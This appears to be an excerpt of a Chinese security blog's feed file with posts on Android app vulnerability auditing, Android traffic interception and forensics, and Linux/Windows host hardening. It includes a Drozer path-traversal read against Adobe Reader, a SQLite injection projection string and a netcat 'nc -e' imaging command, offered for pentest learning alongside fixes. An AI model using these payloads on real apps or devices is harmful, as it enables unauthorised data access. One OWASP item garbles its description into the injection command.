+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ apktool d [app_name].apk</span><br></pre></td></tr></table></figure>
+<p>-d：表示反编译。<br>如果想重新编译一个应用程序，使用-b（build）参数。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ apktool b [folder name] [app_name].apk</span><br></pre></td></tr></table></figure>
+<p>网上有另外一款Virtuous Ten Studio（VTS）工具，其功能与ApkTool类似，只是提供了UI界面方便操作，但只能在windows下运行。下载地址：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://www.virtuous-ten-studio.com/</span><br></pre></td></tr></table></figure>
+<h2 id="Android应用安全漏洞审计"><a href="#Android应用安全漏洞审计" class="headerlink" title="Android应用安全漏洞审计"></a>Android应用安全漏洞审计</h2><p>由于开发人员未严格遵守安全编码规范，或开发过程中的错误代码，导致Android应用程序出现各种类型的安全漏洞，下面将学习Android漏洞的挖掘和利用。</p>
+<h3 id="内容供应器泄漏"><a href="#内容供应器泄漏" class="headerlink" title="内容供应器泄漏"></a>内容供应器泄漏</h3><p>许多应用程序使用内容供应器来存储和查询应用程序中的数据或来自电话的数据。 除非已经定义了内容提供者可以使用权限来访问，否则任何其他应用都可以使用应用所定义的内容供应器来访问应用的数据。 所有内容供应器具有唯一的统一资源标识符（URI）以便被识别和查询。 内容提供者的 URI 的命名标准惯例是以content://开始。<br>如果 Android API 版本低于 17，则内容供应器的默认属性是始终导出。 这意味着除非开发人员指定权限，否则任何应用程序都可以使用应用程序的内容供应器来访问和查询数据。 所有内容供应器都需要在AndroidManifest.xml中注册。 因此，我们可以对应用程序使用 Apktool，并通过查看AndroidManifest.xml文件检查内容供应器。<br>定义内容供应器的一般方法如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;provider</span><br><span class="line">     android:name=<span class="string">"com.test.example.DataProvider"</span></span><br><span class="line">     android:authorities =<span class="string">"com.test.example.DataProvider"</span>&gt;</span><br><span class="line">&lt;/provider&gt;</span><br></pre></td></tr></table></figure>
+<p>下面查看一个内容供应器泄漏漏洞的例子，并尝试利用该漏洞。<br>1.使用ApkTool对应用程序反编译。<br>2.查看定义内容供应器的AndroidManifest.xml文件，也可以使用grep命令从代码中获取内容供应器.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep -R <span class="string">'content://'</span></span><br></pre></td></tr></table></figure></p>
+<p>3.为查询内容供应器并确认漏洞是可利用的，需要在Android设备或模拟器中安装该应用程序，使用以下命令在模拟器中安装该.apk文件。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb install [app_name].apk</span><br><span class="line">Perfirming Streamed Install</span><br><span class="line">Success</span><br></pre></td></tr></table></figure></p>
+<p>然后可以创建一个没有任何权限的应用程序来查询存在漏洞的应用程序的内容供应器，可以使用adb查询内容供应器：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb shell content query --uri [URI of the content provider]</span><br></pre></td></tr></table></figure>
+<p>Drozer是一款针对Android系统的安全测试框架，通过分析AndroidManifest.xml看四大组件中有无可export的，如果有就详细查看可export的组件是否真存在漏洞。下载地址：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://labs.mwrinfosecurity.com/tools/drozer/</span><br></pre></td></tr></table></figure></p>
+<p>安装后需要将代理组件agent.apk安装到模拟器，还需要在启动模拟器时转发一个特定端口31415建立连接。可以使用以下命令完成操作：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb install agent.apk</span><br><span class="line"></span><br><span class="line">$ adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure>
+<p>启动drozer agent代理程序，单击”Embedded Server”&gt;”Disabled”启动服务器。</p>
+<p><img src="/images/drozer server.PNG" alt></p>
+<p>在cmd启动Drozer终端连接到模拟器：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ drozer console connect</span><br></pre></td></tr></table></figure></p>
+<p>成功进入Drozer Console后，运行app.provider.finduri模块查找所有内容供应器。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.provider.finduri [URI of the content provider]</span><br></pre></td></tr></table></figure></p>
+<p>使用app.provider.query模块查询内容供应器URI，如果能够查询到来自内容供应器的数据，意味着内容供应器泄漏数据且存在漏洞，因为Drozer未被明确授予使用数据集的任何权限。</p>
+<p>漏洞修复建议：在创建内容供应器时指定参数<code>android:exported = false</code>，或创建一些新的权限，其他程序在访问供应器之前必须请求它。</p>
+<h3 id="不安全的文件存储"><a href="#不安全的文件存储" class="headerlink" title="不安全的文件存储"></a>不安全的文件存储</h3><p>开发人员对应用程序存储数据时未指定文件的正确操作权限，这些文件有时会被标记成全局可读，其他程序访问不需要请求权限，导致文件不安全存储问题。按照以下步骤对该漏洞进行检测：<br>1.通过<code>adb shell</code>使用cd命令进入<code>/data/data/[app_name]</code>。<br>2.使用<code>find</code>命令搜索特定权限的文件。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># find /data/data/ -perm [permossions value]</span></span><br></pre></td></tr></table></figure></p>
+<p>使用<code>cat</code>和<code>grep</code>等命令可查看文件存储的信息，如：密码，等。</p>
+<p>漏洞修复建议：开发人员设置正确的文件操作权限，对密码等敏感数据使用加密等手段处理。</p>
+<h3 id="目录遍历或本地文件包含漏洞"><a href="#目录遍历或本地文件包含漏洞" class="headerlink" title="目录遍历或本地文件包含漏洞"></a>目录遍历或本地文件包含漏洞</h3><p>应用程序中的目录遍历漏洞允许攻击者使用漏洞读取其他系统文件，该漏洞可使用Drozer进行检测。</p>
+<p>通过分析Adobe Reader 10.3.1版本中存在的目录遍历漏洞，可以清晰地理解该漏洞利用方法。<br>1.使用<code>adb install adobe_reader_x_10.3.1_64606.apk</code>安装.apk程序。<br>2.启动Drozer，使用app.provider.finduri模块查找内容供应器URI。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.provider.finduri com.adobe.reader</span><br><span class="line">Scanning com.adobe.reader...</span><br><span class="line">content://com.adobe.reader.fileprovider/</span><br><span class="line">content://com.adobe.reader.fileprovider</span><br></pre></td></tr></table></figure></p>
+<p>3.使用app.provider.read利用查找到的URI，如尝试读取/proc/cpuinfo文件内容，该文件默认存在所有Android实例中。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.provider.read content://com.adobe.reader.fileprovider/../../../../proc/cpuinfo</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/app_provider_read.PNG" alt></p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>SQL注入与WEB端类似，都是因为开发人员未对用户输入和服务器端输出进行严格检查，Android使用的是SQLite数据库。<br>对SQL注入漏洞的利用，除与WEB端SQL注入漏洞类型利用方法外，还可以使用Drozer的app.provider.query模块利用SQL注入漏洞。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.provider.query [Content Provider URI] --projection <span class="string">"* FROM SQLITE_MASTER WHERE type='table';- -"</span></span><br></pre></td></tr></table></figure>
+<p>上述命令将返回SQLite数据库中全部表的列表，SQLITE_MASTER中保存数据库的基本信息。</p>
+<h3 id="OWASP-Mobile-TOP-10"><a href="#OWASP-Mobile-TOP-10" class="headerlink" title="OWASP Mobile TOP 10"></a>OWASP Mobile TOP 10</h3><ul>
+<li>脆弱的服务器端安全控制<br>  OWASP排名第一的漏洞“脆弱的服务器端安全控制”，就是没有以一个安全的方式从移动应用程序向服务器端发送数据，或在发送数据时暴露了某些敏感API。如：考虑对一个Android应用程序登录服务器的凭据进行身份验证，未对用户输入进行验证，可能被攻击者利用修改凭证来获得服务器敏感或未授权的区域。这是移动端和WEB端都存在的漏洞类型。</li>
+<li>不安全的数据存储<br>  即在设备上存储任意用户都能够访问的与应用程序相关的信息。许多Android应用在shared preferences、SQLite（明文形式）或外部存储器存储用户敏感信息或应用程序信息。</li>
+<li>传输层保护不足<br>  许多Android开发者使用了不安全方式进行数据传输，如HTTP协议，或未正确实现SSL，这使得程序容易受到各种类型攻击，如从应用向服务器发送数据时进行数据包拦截，参数操作，修改响应数据，以便获得应用锁定区域的访问权限。</li>
+<li>意外的数据泄露<br>  此漏洞是由于应用程序本身存储数据位置是脆弱的，如：剪切板、URL缓存、浏览器cookies、HTML5数据存储，等。</li>
+<li>弱授权和身份认证<br>  一个Android应用程序，如果试图在没有适当安全措施的情况下通过客户端检测进行用户验证或授权，那么就是存在风险的。应当指出的是，手机root后大多数客户端保护都是可以绕过的，因此建议开发人员使用适当的检测方法在服务器端进行身份验证和授权，并在移动端使用一个随机生成的令牌验证用户。</li>
+<li>密码破解<br>  使用不安全的加密函数加密数据组件，包括某些已知不安全加密算法，如MD5、SHA1、RC2等。</li>
+<li>客户端注入<br>  run app.provider.query [Content Provider URI] –projection “* FROM SQLITE_MASTER WHERE type=’table’;- -“</li>
+<li>通过不可信输入进行安全决策<br>  在移动应用程序中，开发人员应该清洗和检查用户输入或其他相关输入，不可信输入可能导致应用中其他安全风险，如客户端注入。</li>
+<li>Session会话处理不当<br>  在对一个应用程序的session进行处理时，开发人员需要关注很多因素，如合适的过期身份验证cookie，安全令牌创建，cookie生成和旋转，后台无效session等。在web应用和Android应用程序之间必须保存一个适当的安全同步。</li>
+<li>缺乏二进制文件保护<br>  不能有效阻止应用程序被逆向或反编译。apktool、dex2jar等工具对Android进行逆向，从而导致各种安全风险，为防止应用被逆向，开发人员可以使用proguardand和dasho等对应用进行加固。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Android安全</category>
+      </categories>
+      <tags>
+        <tag>Android安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Android流量分析和取证</title>
+    <url>/2019/04/10/Android%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%92%8C%E5%8F%96%E8%AF%81/</url>
+    <content><![CDATA[<p>应用程序通常会在网络数据中泄漏敏感信息，也会经常遇到使用不安全网络协议进行身份验证和会话管理的应用程序。因此，安全流量分析是Android渗透测试过程中重要一环。</p>
+<h2 id="Android流量分析方式"><a href="#Android流量分析方式" class="headerlink" title="Android流量分析方式"></a>Android流量分析方式</h2><p>Android流量分析分为主动分析和被动分析，区别如下：</p>
+<ul>
+<li>被动分析：在被动分析中，应用程序发送的网络流量不会被拦截，攻击者通过嗅探工具嗅探所有流量包，并用分析器分析其中可能泄漏的敏感数据或安全漏洞。</li>
+<li>主动分析：在主动分析中，攻击者主动拦截所有正在进行的网络通信，并对数据包进行分析、评估或修改。该过程需要设置代理，通过应用和设备的所有网络流量全部通过该代理程序。</li>
+</ul>
+<h3 id="被动分析"><a href="#被动分析" class="headerlink" title="被动分析"></a>被动分析</h3><p>下载tcpdump-arm二进制文件<code>https://www.androidtcpdump.com/android-tcpdump/downloads</code>，然后使用<code>adb</code>的<code>push</code>命令将二进制文件推送到Android的/data/local/tmp目录。同样的，需要从设备中拉取内容的情况下可以使用<code>pull</code>命令。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb push tcpdump /data/<span class="built_in">local</span>/tmp/tcpdump</span><br></pre></td></tr></table></figure>
+<p>使用<code>chmod</code>命令对tcpdump授予执行权限</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># chmod 777 /data/local/tmp/tcpdump</span></span><br></pre></td></tr></table></figure>
+<p>运行tcpdump并将抓取的数据包输出到.pcap文件。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./tcpdump -v -s 0 -w output.pcap</span></span><br></pre></td></tr></table></figure>
+<p>-s：从每个封包抽取给定字节的数据，默认65535字节。<br>-v：输出详细数据。<br>-w：写入原始数据包的文件名。</p>
+<p>在抓包过程中，使用手机浏览器访问互联网，tcpdump会抓取该过程网络流量。抓包完成后使用<code>adb pull</code>命令拉取抓到的流量文件。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb pull /data/<span class="built_in">local</span>/tmp/output.pcap output.pcap</span><br></pre></td></tr></table></figure>
+<p>如果提示需要修改output.pcap文件权限才能拉取，使用<code>chmod 666 output.pcap</code>修改后拉取。最后使用wireshark对数据包进行分析。</p>
+<h3 id="主动分析"><a href="#主动分析" class="headerlink" title="主动分析"></a>主动分析</h3><h4 id="HTTP流量拦截："><a href="#HTTP流量拦截：" class="headerlink" title="HTTP流量拦截："></a>HTTP流量拦截：</h4><p>以命令行方式启动可读写权限，并设置代理。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ emulator -avd [avd_name] -http-proxy 127.0.0.1:8080 -writable-system</span><br></pre></td></tr></table></figure>
+<p><img src="/images/http-proxy.PNG" alt></p>
+<p>然后启动Burpsuite并配置好本地代理，模拟器产生的所有网络流量就能够全部抓取到。</p>
+<h4 id="HTTPS流量拦截："><a href="#HTTPS流量拦截：" class="headerlink" title="HTTPS流量拦截："></a>HTTPS流量拦截：</h4><p>对于HTTPS流量的代理设置需要安装Burpsuite CA证书。首先在本地<code>http://burp</code>下载CA证书cacert.der，导入本地浏览器后导出PortSwiggerCA.crt证书文件。然后使用命令push到模拟器中。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb push PortSwiggerCA.crt /mnt/sdcard/PortSwiggerCA.crt</span><br></pre></td></tr></table></figure>
+<p>最后到模拟器中从SD卡安装证书，完成安装就可以使用Burpsuite抓取HTTPS流量。</p>
+<p><img src="/images/HTTPS.PNG" alt></p>
+<h4 id="Genymotion模拟器流量拦截："><a href="#Genymotion模拟器流量拦截：" class="headerlink" title="Genymotion模拟器流量拦截："></a>Genymotion模拟器流量拦截：</h4><p>Genymotion模拟器代理配置有点坑，摸索好长时间发现只能通过模拟器里WIFI高级代理设置，然后在Burpsuite中设置相同IP地址的代理IP。</p>
+<p><img src="/images/genymotion_proxy.PNG" alt></p>
+<p><img src="/images/burpsuite.PNG" alt></p>
+<p>HTTPS流量拦截配置同样需要安装CA证书即可。另外可以尝试fiddler和charles抓包分析。</p>
+<p>应用程序流量安全防护需要保证HTTPS协议的安全连接，并配置安全证书。这种场景中对HTTPS流量拦截需要分析应用程序验证证书的方式，甚至需要对程序进行逆向、修改和重新编译。</p>
+<h2 id="Android取证"><a href="#Android取证" class="headerlink" title="Android取证"></a>Android取证</h2><p>取证是使用自动或手动方式从设备中提取和分析数据的过程，大致分为逻辑采集和物理采集。</p>
+<ul>
+<li>逻辑采集：取证人员与设备交互并从文件系统中提取数据，数据涉及通讯录、信息、通话记录、浏览器历史、各类应用数据等任何内容。优点是大多数情况下比物理采集更容易获取逻辑信息，但存在数据被篡改的风险。</li>
+<li>物理采集：该取证方式需要对物理存储介质进行逐位拷贝，该方法耗时长，但更可靠。</li>
+</ul>
+<p>Android文件系统的主分区通常为YAFFS2(Yet Another Flash File System 2)，YAFFS是由Aleph One公司所发展出来的NAND flash 嵌入式文件系统，为设备提供了更高的效率和性能，以及更低的占用空间。</p>
+<p>使用<code>adb shell</code>进入shell命令行，查看<code>/proc/mtd</code>或<code>/proc/partitions</code>文件可查看Android设备分区情况。Android系统一般包括system，cache，data，boot等，同样可以使用mount命令查看已挂载分区和类型。</p>
+<h3 id="使用dd提取数据"><a href="#使用dd提取数据" class="headerlink" title="使用dd提取数据"></a>使用dd提取数据</h3><p>取证过程一般要求不能直接对取证设备进行操作，linux下dd工具可以完整复制取证系统且不做任何修改。</p>
+<p>1.使用<code>cat /proc/mtd</code>或<code>cat /proc/partitions</code>查找目标分区。<br>2.使用dd命令将目标分区复制到<code>/mnt/sdcard</code>中。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dd <span class="keyword">if</span>=[源文件] of=[目标文件] count=1 bs=512</span><br></pre></td></tr></table></figure>
+<p>3.等待操作完成，使用<code>adb pull</code>命令将复制的分区文件拉取到本地。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb pull /mnt/sdcard/data.img data.img</span><br></pre></td></tr></table></figure>
+<p>4.另外可以使用Netcat将映像直接保存到远程系统，需要将端口从设备转发到系统，并使用Netcat监听5566端口，然后进入<code>adb shell</code>使用dd工具将输出转发到Netcat。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:5566 tcp:5566</span><br><span class="line"></span><br><span class="line">nc 127.0.0.1 5566 &gt; data.img</span><br><span class="line"></span><br><span class="line">nc -l -p 5566 -e dd <span class="keyword">if</span>=[源文件]</span><br></pre></td></tr></table></figure>
+<h3 id="使用Andriller提取数据"><a href="#使用Andriller提取数据" class="headerlink" title="使用Andriller提取数据"></a>使用Andriller提取数据</h3><p>Andriller是用python编写的开源多平台取证工具，该工具有助于从设备中提取一些基本信息并进行取证分析，并生成HTML取证报告。<br>Andriller下载地址：<code>https://www.andriller.com/download/</code></p>
+<p><img src="/images/andriller.PNG" alt></p>
+<h3 id="使用AFLogical提取联系人、通话记录和短信"><a href="#使用AFLogical提取联系人、通话记录和短信" class="headerlink" title="使用AFLogical提取联系人、通话记录和短信"></a>使用AFLogical提取联系人、通话记录和短信</h3><p>AFLogical是一款开源Android取证框架，可以从设备创建逻辑采集并将结果呈现给取证人员，包括提取联系人、通话记录和短信等关键组件。<br>AFLogical下载地址：<code>https://github.com/nowsecure/android-forensics</code>，将下载的<code>.apk</code>文件安装到模拟器并运行，选择需要提取的信息，然后单击<code>Capture</code>，AFLogical会将选择的信息提取保存到SD卡的csv文件中。完成后就可以使用<code>adb pull</code>命令将提取的csv文件拉取到本地。</p>
+<p><img src="/images/aflogical.PNG" alt></p>
+<p><img src="/images/forensics.PNG" alt></p>
+<h3 id="手动转储应用的数据库"><a href="#手动转储应用的数据库" class="headerlink" title="手动转储应用的数据库"></a>手动转储应用的数据库</h3><p>在某些情况下，需要使用手动方式从设备中提取一些信息，由于应用程序大多使用数据库存储数据，如应用程序目录/data/data/com.android.xxx/databases文件夹。Android大部分使用SQLite数据库和.db文件格式，可以安装以下步骤手动提取数据库文件。</p>
+<ul>
+<li><p>进入取证设备目录，并创建一个文件夹存储提取的数据库文件。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir /mnt/sdcard/DBBack</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查找所有.db文件并复制到创建的文件夹中。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find . -name <span class="string">"*.db"</span> -<span class="built_in">type</span> f -<span class="built_in">exec</span> cp &#123;&#125; /mnt/sdcard/DBBack \;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用tar或zip将文件夹压缩并使用<code>adb pull</code>目录拉取到本地系统。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tar cvf dbback.tar DBBack/</span><br><span class="line"></span><br><span class="line">$ adb pull /mnt/sdcard/dbback.tar dbback.tar</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将文件拉取到本地后，解压文件即可对数据库文件进行分析。分析SQLite数据库文件可以使用SQLite数据库浏览器,下载地址：<code>https://github.com/sqlitebrowser/sqlitebrowser</code>。</p>
+</li>
+</ul>
+<h3 id="使用logcat记录日志"><a href="#使用logcat记录日志" class="headerlink" title="使用logcat记录日志"></a>使用logcat记录日志</h3><p>在某些情况下，Android logcat可以辅助取证过程，可以收集包括电话及录音机上执行的操作日志。使用<code>adb logcat</code>捕获保存logcat转储文件并输出到指定文件，以供后续分析。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb logcat &gt; logcat_dump.log</span><br></pre></td></tr></table></figure>
+<p>logcat还可以设置其他参数收集特定内容的日志：<br>-b：显示缓冲区（如radio收音机）的logcat。<br>-v：控制输出格式，如verbose，time，tag，等。<br>-d：调试。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb logcat -v time -b radio -d</span><br></pre></td></tr></table></figure>
+<p>另外可以使用<code>dmesg</code>打印内核消息，使用<code>getprop</code>打印设备属性<code>adb shell getprop</code>。</p>
+<h3 id="使用备份功能提取应用数据"><a href="#使用备份功能提取应用数据" class="headerlink" title="使用备份功能提取应用数据"></a>使用备份功能提取应用数据</h3><p>Android 4.0开始引入adb备份功能，用于创建应用程序备份及完整数据，此功能可用于取证过程捕获全部数据。</p>
+<ul>
+<li><p>使用<code>pm list</code>查找目标应用程序包。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb shell pm list package -f chrome</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用<code>adb backup</code>备份目标应用程序，备份文件为<code>.ab</code>格式。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb backup [package_name] -f [target_file].ab</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运行命令之后需要到模拟器设备上进行确认操作，并选择设置密码。然后使用<code>dd</code>和<code>openssl</code>创建<code>.tar</code>压缩文件。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dd <span class="keyword">if</span>=[target_file].ab bs=24 skip=1 | openssl zlib -d &gt; [file].tar</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后就可以解压文件分析数据库<code>.db</code>文件。</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Android安全</category>
+      </categories>
+      <tags>
+        <tag>Android安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安全加固</title>
+    <url>/2019/04/27/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</url>
+    <content><![CDATA[<h2 id="主机安全加固"><a href="#主机安全加固" class="headerlink" title="主机安全加固"></a>主机安全加固</h2><h3 id="Linux主机"><a href="#Linux主机" class="headerlink" title="Linux主机"></a>Linux主机</h3><ol>
+<li>系统账号安全</li>
+</ol>
+<p>1.1 删除或禁用不必要的账号</p>
+<ul>
+<li>删除不必要的账号：<code>userdel &#39;username&#39;</code></li>
+<li>锁定不必要的账号：<code>passwd -l &#39;username&#39;</code></li>
+<li>解锁账号：<code>passwd -u &#39;username&#39;</code></li>
+</ul>
+<p>1.2 特殊权限账号</p>
+<p>检查空口令账号和root权限账号。</p>
+<ul>
+<li>查看空口令账号：<code>awk -F: &#39;($2==&quot;&quot;)&#39; /etc/shadow</code></li>
+<li>查看UID为0的账号：<code>awk -F: &#39;($3==0)&#39; /etc/passwd</code></li>
+</ul>
+<p>1.3 设置口令策略</p>
+<p>修改口令策略配置文件<code>vi /etc/login.defs</code>。</p>
+<ul>
+<li>PASS_MAX_DAYS 90 #用户密码最长使用天数</li>
+<li>PASS_MIN_DAYS 0 #用户密码最短使用天数</li>
+<li>PASS_WARN_AGE 7 #用户密码到期前n天提醒</li>
+</ul>
+<p>使用chage命令修改口令策略。</p>
+<ul>
+<li>chage -m 0 -M 30 -E 2020-01-01 -W 7 ‘username’ #密码最长使用30天，最短使用0天，2020年1月1日过期，过期前7天提醒用户。</li>
+</ul>
+<p>设置账号锁定策略，修改配置文件<code>vi /etc/pam.d/common-auth</code>添加以下内容：</p>
+<ul>
+<li><code>auth required pam_tally.so onerr=fail deny=3 unlock_time=300</code></li>
+</ul>
+<p>1.4 限制用户su策略</p>
+<p>修改配置文件<code>vi /etc/pam.d/su</code>，添加以下内容设置用户组可以su到root权限：</p>
+<ul>
+<li><code>auth required pam_wheel.so group=&#39;group_name&#39;</code></li>
+</ul>
+<p>1.5 禁止root账号登录</p>
+<p>修改配置文件<code>vi /etc/ssh/sshd_config</code>，将<code>PermitRootLogin</code>的值改为<code>no</code>，保存后重启SSH服务。</p>
+<ol start="2">
+<li>系统服务安全</li>
+</ol>
+<p>2.1 SSH服务策略</p>
+<p>修改配置文件<code>vi /etc/ssh/sshd_config</code></p>
+<ul>
+<li>禁止root账号登录。</li>
+<li>设置SSH协议版本：修改<code>Protocol</code>的值为2。</li>
+<li>修改允许密码错误次数：修改<code>MaxAuthTries</code>值为3。</li>
+</ul>
+<p>2.2 禁用不必要的服务</p>
+<p>CentOS7系统以上使用命令<code>systemctl disable &#39;service_name&#39;</code><br>CentOS6系统及以下使用命令<code>chkconfig --level &lt;init级别&gt; &#39;service_name&#39; off</code>设置服务在指定init级别下不自动启动。</p>
+<ol start="3">
+<li>文件系统</li>
+</ol>
+<p>3.1 设置登录超时</p>
+<p>修改配置文件<code>vi /etc/profile</code>，注释<code>TMOUT=</code>开头的行，设置<code>TMOUT=180</code>，超时时间为3分钟。</p>
+<p>3.2 设置umask值</p>
+<p>修改配置文件<code>vi /etc/profile</code>，添加行<code>umask 027</code>，设置新创建的文件属主拥有读写执行权限，同组用户拥有读和执行权限，其他用户无权限。</p>
+<ol start="4">
+<li>日志系统</li>
+</ol>
+<p>4.1 syslog日志</p>
+<p>Linux默认启用以下类型日志：</p>
+<ul>
+<li>系统日志（默认） <code>/var/log/messages</code></li>
+<li>crontab定期任务日志（默认） <code>/var/log/cron</code></li>
+<li>安全日志（默认） <code>/var/log/secure</code></li>
+<li>部分系统使用syslog-ng日志，配置文件为<code>/etc/syslog-ng/syslog-ng.conf</code></li>
+</ul>
+<p>4.2 记录所有用户登录和操作日志</p>
+<p>修改配置文件<code>vi /etc/profile</code>，在配置文件中添加以下内容：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span></span><br><span class="line">USER=`whoami`</span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null| awk <span class="string">'&#123;print $NF&#125;'</span>|sed -e <span class="string">'s/[()]//g'</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$USER_IP</span>"</span> = <span class="string">""</span> ]; <span class="keyword">then</span></span><br><span class="line">USER_IP=`hostname`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ ! -d /var/<span class="built_in">log</span>/<span class="built_in">history</span> ]; <span class="keyword">then</span></span><br><span class="line">mkdir /var/<span class="built_in">log</span>/<span class="built_in">history</span></span><br><span class="line">chmod 777 /var/<span class="built_in">log</span>/<span class="built_in">history</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ ! -d /var/<span class="built_in">log</span>/<span class="built_in">history</span>/<span class="variable">$&#123;LOGNAME&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">mkdir /var/<span class="built_in">log</span>/<span class="built_in">history</span>/<span class="variable">$&#123;LOGNAME&#125;</span></span><br><span class="line">chmod 300 /var/<span class="built_in">log</span>/<span class="built_in">history</span>/<span class="variable">$&#123;LOGNAME&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">export</span> HISTSIZE=4096</span><br><span class="line">DT=`date +<span class="string">"%Y%m%d_%H:%M:%S"</span>`</span><br><span class="line"><span class="built_in">export</span> HISTFILE=<span class="string">"/var/log/history/<span class="variable">$&#123;LOGNAME&#125;</span>/<span class="variable">$&#123;USER&#125;</span>@<span class="variable">$&#123;USER_IP&#125;</span>_<span class="variable">$DT</span>"</span></span><br><span class="line">chmod 600 /var/<span class="built_in">log</span>/<span class="built_in">history</span>/<span class="variable">$&#123;LOGNAME&#125;</span>/*<span class="built_in">history</span>* 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>使用命令<code>source /etc/profile</code>加载配置生效，系统将在/var/log/history目录下以每个用户名创建一个文件夹，用户每次退出都会产生包括用户名、登录IP地址、登录时间的日志文件，及用户本次所有操作（root除外）。</p>
+<p>Linux基线检查脚本：<a href="https://github.com/myh0st/scripts/blob/master/linuxsec.sh" target="_blank" rel="noopener">https://github.com/myh0st/scripts/blob/master/linuxsec.sh</a></p>
+<h3 id="Windows主机"><a href="#Windows主机" class="headerlink" title="Windows主机"></a>Windows主机</h3><ol>
+<li>系统账号安全和认证</li>
+</ol>
+<p>1.1 系统账号策略</p>
+<ul>
+<li>禁用Guest账号。</li>
+<li>禁用或删除其他不必要账号。（建议先禁用一段时间，确认没问题后再删除）</li>
+<li>不显示最后登录的用户名：<code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;安全选项&gt;交互式登录：不显示最后的用户名&gt;已启用</code>。</li>
+</ul>
+<p>1.2 设置口令策略</p>
+<ul>
+<li>密码最短长度、复杂度。</li>
+<li>密码最长留存期应小于90天：<code>控制面板&gt;管理工具&gt;本地安全策略&gt;账户策略&gt;密码策略&gt;密码最常使用期限</code>设置90天</li>
+<li>密码最短使用期限设置7天。</li>
+<li>设置账号锁定策略：<code>控制面板&gt;管理工具&gt;本地安全策略&gt;账户策略&gt;帐户锁定策略&gt;帐户锁定阈值</code>设置5次无效登录</li>
+</ul>
+<p>1.3 授权</p>
+<ul>
+<li>设置只允许Administrators组有远程关机权限：<code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;用户权限分配&gt;从远端系统强制关机</code>权限只分配给Administrators组。</li>
+<li>设置只允许Administrators组有本地关机权限：<code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;用户权限分配&gt;关闭系统</code>权限只分配给Administrators组。</li>
+<li>设置取得文件或其他对象的所有权权限只分配给Administrators组：<code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;用户权限分配&gt;取得文件或其它对象的所有权</code>权限只分配给Administrators组。</li>
+<li>配置指定用户允许本地登录此计算机：<code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;用户权限分配&gt;允许本地登录</code>权限分配给指定用户。</li>
+<li>配置指定用户从网络访问此计算机：<code>控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;用户权限分配&gt;从网络访问此计算机</code>权限分配给指定用户。</li>
+</ul>
+<ol start="2">
+<li>日志系统</li>
+</ol>
+<ul>
